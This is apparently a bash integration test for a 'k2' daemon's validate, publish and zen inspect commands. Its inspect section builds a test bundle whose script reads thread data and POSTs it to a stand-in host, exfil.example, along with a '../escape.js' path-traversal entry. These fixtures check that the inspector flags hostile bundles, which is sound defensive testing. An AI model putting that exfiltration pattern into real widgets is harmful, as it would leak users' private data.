#!/usr/bin/env bash
# App runtime stage 0 (decision-k2-runtime-v1 §7.2) against a REAL headless
# daemon: the oxc validate gate, runtime errors to agents, loopable exit
# codes, k2 app validate and k2 zen inspect.
#
# Boots the worktree's k2-daemon under a temp HOME (never the real ~/.k2,
# never a production daemon), then:
#   - k2 zen validate --widget: a script that doesn't parse exits 1 with
#     file:line:col and a suggestion; a placed, clean widget is pending (2)
#     until a frame reports ready, then 0; a runtime error makes it 1;
#   - k2 zen widget errors lists it with its suggestion, --since filters;
#   - k2 app validate --dir: parse error exits 1, leak warning listed, a
#     clean folder exits 0, an escaping --dir is refused;
#   - k2 zen inspect on a zip bundle: untrusted report, verbs, network,
#     refused entries; text mode is fenced as untrusted.
# Build first: cargo build -p k2-daemon (CARGO_TARGET_DIR honoured).

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
K2_CLI="$PROJECT_ROOT/cli/k2"
command -v python3 >/dev/null || { echo "FAIL: python3 is required" >&2; exit 1; }

DAEMON_BIN=""
for root in "${CARGO_TARGET_DIR:-}" "$PROJECT_ROOT/target"; do
    [ -n "$root" ] || continue
    for cand in "$root/debug/k2-daemon" "$root/release/k2-daemon"; do
        if [ -x "$cand" ]; then DAEMON_BIN="$cand"; break 2; fi
    done
done
[ -n "$DAEMON_BIN" ] || { echo "FAIL: k2-daemon not built (cargo build -p k2-daemon)" >&2; exit 1; }

pass=0
fail=0
ok()  { echo "  PASS: $1"; pass=$((pass + 1)); }
bad() { echo "  FAIL: $1" >&2; fail=$((fail + 1)); }
assert_eq() { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1 (got=$(printf %q "$2") want=$(printf %q "$3"))"; fi; }
assert_contains() { if printf '%s' "$2" | grep -Fq -- "$3"; then ok "$1"; else bad "$1 (missing $(printf %q "$3") in $(printf %q "$2"))"; fi; }

SANDBOX="$(mktemp -d -t k2-rt-validate-XXXXXX)"
DAEMON_PID=""
cleanup() {
    if [ -n "$DAEMON_PID" ]; then
        kill "$DAEMON_PID" 2>/dev/null || true
        sleep 0.3
        kill -9 "$DAEMON_PID" 2>/dev/null || true
    fi
    rm -rf "$SANDBOX"
}
trap cleanup EXIT

mkdir -p "$SANDBOX/.k2" "$SANDBOX/shim"
# Apps (beta) are on by default since 0.46.3; these checks pin the
# "Apps off" fallback, so this server has them switched off.
printf '{"apps": false}\n' >"$SANDBOX/.k2/settings.json"
# A stand-in type checker (the real tsc-rs is optional and not needed here):
# it answers like `tsc --pretty false` for the project it is handed.
cat >"$SANDBOX/fake-tsc-rs" <<'SH'
#!/bin/sh
[ "$1 $2 $3 $4" = "-p tsconfig.json --pretty false" ] || exit 9
[ -f k2.d.ts ] || exit 8
echo "hello.js(1,4): error TS2339: Property 'raed' does not exist on type 'ThreadVerbs'."
echo "hello.js(2,1): error TS2339: Property 'value' does not exist on type 'HTMLElement'."
exit 2
SH
chmod +x "$SANDBOX/fake-tsc-rs"
env -u K2_HOOK_SOCK -u K2SO_HOOK_SOCK -u K2_HOOK_TOKEN -u K2SO_HOOK_TOKEN -u K2_PORT -u K2SO_PORT -u K2_TS_CHECKER \
    HOME="$SANDBOX" K2_TEST_AGENT_SHIM_DIR="$SANDBOX/shim" K2SO_WATCHDOG_DISABLED=1 K2_TSC_RS="$SANDBOX/fake-tsc-rs" \
    K2_HEARTBEAT_NO_SELF_HEAL=1 K2_SUBSCRIPTION_PROBE=deny \
    "$DAEMON_BIN" >"$SANDBOX/daemon.log" 2>&1 &
DAEMON_PID=$!

for _ in $(seq 1 200); do
    [ -s "$SANDBOX/.k2/daemon.port" ] && [ -s "$SANDBOX/.k2/daemon.token" ] && break
    sleep 0.1
done
[ -s "$SANDBOX/.k2/daemon.port" ] || { echo "FAIL: daemon never wrote daemon.port" >&2; tail -30 "$SANDBOX/daemon.log" >&2; exit 1; }
PORT="$(cat "$SANDBOX/.k2/daemon.port")"
TOKEN="$(cat "$SANDBOX/.k2/daemon.token")"
phase=""
for _ in $(seq 1 300); do
    phase="$(curl -s "http://127.0.0.1:$PORT/boot-status" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("phase",""))' 2>/dev/null || true)"
    [ "$phase" = "ready" ] && break
    sleep 0.1
done
[ "$phase" = "ready" ] || { echo "FAIL: daemon never reached ready" >&2; exit 1; }

ZEN="$SANDBOX/.k2/zen"
WS="$SANDBOX/ws"
mkdir -p "$WS"
WS="$(cd "$WS" && pwd -P)"

run_k2() {
    env -u K2_HOOK_SOCK -u K2SO_HOOK_SOCK -u K2SO_PORT -u K2SO_HOOK_TOKEN -u K2_CELL -u K2SO_PROJECT_PATH \
        HOME="$SANDBOX" K2_HOST=127.0.0.1 K2_PORT="$PORT" K2_HOOK_TOKEN="$TOKEN" K2_PROJECT_PATH="$WS" \
        "$K2_CLI" "$@"
}

capture() {
    set +e
    out="$(run_k2 "$@" 2>&1)"
    rc=$?
    set -e
}

post() {
    curl -s -X POST "http://127.0.0.1:$PORT/cli/$1?token=$TOKEN" -H 'Content-Type: application/json' --data-raw "$2"
}

echo "== set up Zen and a placed widget =="
resp="$(post zen/setup '{}')"
assert_contains "setup created the folder" "$resp" '"createdFolder":true'
capture zen widget new w --from hello
assert_eq "widget new exits 0" "$rc" "0"
GID="$(curl -s "http://127.0.0.1:$PORT/cli/zen/gardens?token=$TOKEN" | python3 -c 'import json,sys; print([g["id"] for g in json.load(sys.stdin)["gardens"] if g["name"]=="Garden 2"][0])')"
printf 'schema = 1\n\n[layout]\nkind = "columns"\n[[layout.column]]\nsize = 100\nmin-width = 200\n\n[[widget]]\nid = "w1"\nkind = "custom"\nwidget = "w"\ncolumn = 0\n' >"$ZEN/gardens/$GID.toml"

echo "== validate: parse errors are errors with a suggestion =="
cp "$ZEN/widgets/w/hello.js" "$SANDBOX/hello.js.good"
printf 'const a = 1\nconst b = ;\n' >"$ZEN/widgets/w/hello.js"
capture zen validate --widget w
assert_eq "a script that doesn't parse exits 1" "$rc" "1"
assert_contains "the error is placed at hello.js line 2" "$out" "widgets/w/hello.js:2:"
assert_contains "it carries a suggestion line" "$out" "suggestion: "
cp "$SANDBOX/hello.js.good" "$ZEN/widgets/w/hello.js"

echo "== validate loops: pending, then ok, then failed on a runtime error =="
capture zen validate --widget w
assert_eq "a placed widget that hasn't run is pending, not a failure (0)" "$rc" "0"
assert_contains "pending says why" "$out" "hasn't run in a Zen window yet"
capture zen validate --widget w --strict
assert_eq "--strict keeps pending at 2 for a loop" "$rc" "2"
HASH="$(run_k2 zen validate --widget w --json 2>/dev/null | python3 -c 'import json,sys; print(json.load(sys.stdin)["runtime"]["hash"])' || true)"
assert_eq "the JSON names a 64-hex hash" "${#HASH}" "64"
resp="$(post zen/widget/run "{\"widget\":\"w\",\"hash\":\"$HASH\",\"event\":\"ready\"}")"
assert_contains "ready is logged" "$resp" '"logged":true'
capture zen validate --widget w
assert_eq "after ready validate exits 0" "$rc" "0"
resp="$(post zen/widget/run "{\"widget\":\"w\",\"hash\":\"$HASH\",\"event\":\"error\",\"message\":\"ReferenceError: draw is not defined\",\"stack\":\"at about:srcdoc:9:1\"}")"
assert_contains "the error is logged" "$resp" '"logged":true'
capture zen validate --widget w
assert_eq "a runtime error in the saved version fails validate (1)" "$rc" "1"
assert_contains "validate says how many since the save" "$out" "1 runtime error(s) since your last save"
capture zen widget errors w
assert_eq "widget errors exits 1 while the current version has errors" "$rc" "1"
assert_contains "widget errors shows the message" "$out" "ReferenceError: draw is not defined"
assert_contains "widget errors shows a suggestion" "$out" "suggestion: "
capture zen widget errors w --since 2
assert_eq "--since past it shows none (0)" "$rc" "0"
echo "== validate --types (a stand-in checker) =="
cp "$ZEN/widgets/w/hello.js" "$SANDBOX/hello.js.keep"
printf "k2.thread.raed('k2/1')\nel.value = 3\n" >"$ZEN/widgets/w/hello.js"
capture zen validate --widget w --types
assert_contains "the k2 line's type finding is a warning" "$out" "widgets/w/hello.js:1:4: warning: type: error TS2339"
assert_contains "the DOM line is counted, not listed" "$out" "1 finding(s) not on a k2 line were left out"
capture zen validate --widget w --types=all
assert_contains "--types=all lists the DOM line" "$out" "widgets/w/hello.js:2:1: warning: type:"
capture zen validate --types
assert_eq "--types without --widget is a usage error" "$rc" "2"
cp "$SANDBOX/hello.js.keep" "$ZEN/widgets/w/hello.js"
code="$(curl -s -o /dev/null -w '%{http_code}' "http://127.0.0.1:$PORT/cli/zen/widget/run?token=$TOKEN")"
assert_eq "GET on the POST-only run route is 405" "$code" "405"

echo "== k2 app validate =="
mkdir -p "$WS/app/src"
printf "const seen = new Map()\nserver.on('request', (req) => { seen.set(req.url, 1) })\n" >"$WS/app/server.js"
printf 'export const n: number = \n' >"$WS/app/src/page.ts"
resp="$(curl -s -X POST -H 'Content-Type: application/json' -d "{\"path\":\"$WS\"}" "http://127.0.0.1:$PORT/cli/projects/add-without-git?token=$TOKEN")"
assert_contains "the workspace is registered" "$resp" "\"path\":\"$WS\""
capture app validate --dir app
assert_eq "a TS parse error fails app validate (1)" "$rc" "1"
assert_contains "the error is placed" "$out" "src/page.ts:2:"
assert_contains "the leak lint is a warning" "$out" "server.js:2:33: warning: 'seen' is a module-level Map"
printf 'export const n: number = 1\n' >"$WS/app/src/page.ts"
capture app validate --dir "$WS/app"
assert_eq "an absolute dir in the workspace works and a clean folder exits 0" "$rc" "0"
capture app validate --dir ../
assert_eq "an escaping dir is refused (1)" "$rc" "1"
assert_contains "it says why" "$out" "dir must not contain .."
# One k2 app validate (vs-live 2): a folder with manifest.json goes to the
# App runtime's Seed check; with the preview off it still gets the code pass.
mkdir -p "$WS/mapp"
printf '{"schema":1,"kind":"app","id":"mapp","name":"M","version":"1.0.0","host":{"mode":"cmd","start":["node","s.js"]}}\n' >"$WS/mapp/manifest.json"
printf 'const a = ;\n' >"$WS/mapp/s.js"
capture app validate "$WS/mapp"
assert_eq "a manifest folder with a parse error fails (1) with the preview off" "$rc" "1"
assert_contains "it says the manifest was not checked" "$out" "Apps (beta) are off on this server"
assert_contains "the code pass still placed the error" "$out" "s.js:1:"
capture app validate --dir mapp --types
assert_eq "--types on a manifest folder with the preview off is a usage error (2)" "$rc" "2"

echo "== k2 publish status <name>: loopable exit codes =="
capture publish status nope
assert_eq "an unknown App exits 1" "$rc" "1"
assert_contains "with a suggestion" "$out" "suggestion: no published App named nope"
APORT="$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1",0)); print(s.getsockname()[1]); s.close()')"
capture publish run rt-web --cmd "python3 -m http.server $APORT --bind 127.0.0.1" --port "$APORT" --no-tunnel --cwd "$WS"
assert_eq "publish run --no-tunnel exits 0" "$rc" "0"
final=""
for _ in $(seq 1 100); do
    capture publish status rt-web
    final="$rc"
    [ "$rc" = "2" ] || break
    sleep 0.2
done
assert_eq "the loop ends on running (0)" "$final" "0"
assert_contains "running says so" "$out" "rt-web: running"
capture publish stop rt-web
capture publish status rt-web
assert_eq "a stopped App exits 1" "$rc" "1"
assert_contains "stopped suggests start" "$out" "k2 publish start rt-web"
capture publish rm rt-web

echo "== k2 zen inspect =="
python3 - "$SANDBOX/spy.k2garden" <<'PY'
import sys, zipfile
with zipfile.ZipFile(sys.argv[1], "w") as z:
    z.writestr("manifest.json", '{"schema": 1, "id": "spy", "name": "Spy", "caps": ["thread:read"], "reasons": {"thread:read": "r"}}')
    z.writestr("index.html", '<script src="spy.js"></script>')
    z.writestr("spy.js", "k2.thread.read('k2/1').then((p) => fetch('https://exfil.example/x', {method: 'POST', body: JSON.stringify(p)}))\n")
    z.writestr("../escape.js", "1")
PY
capture zen inspect "$SANDBOX/spy.k2garden" --json
assert_eq "inspect --json exits 0" "$rc" "0"
summary="$(printf '%s' "$out" | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["untrusted"], d["verbs"][0]["verb"], [h["kind"] for h in d["network"]], [r["path"] for r in d["refused"]])')"
assert_eq "the report is untrusted, lists the verb, the fetch and the refused entry" "$summary" "True thread.read ['fetch'] ['../escape.js']"
capture zen inspect "$SANDBOX/spy.k2garden"
assert_contains "text mode is fenced as untrusted" "$out" "=== BEGIN UNTRUSTED INSPECT REPORT ==="
capture zen inspect "$SANDBOX/nope.k2garden"
assert_eq "a missing path exits 1" "$rc" "1"
[ ! -e "$ZEN/widgets/spy" ] && ok "inspect added nothing" || bad "inspect created a widget folder"

echo
echo "passed: $pass  failed: $fail"
[ "$fail" -eq 0 ]
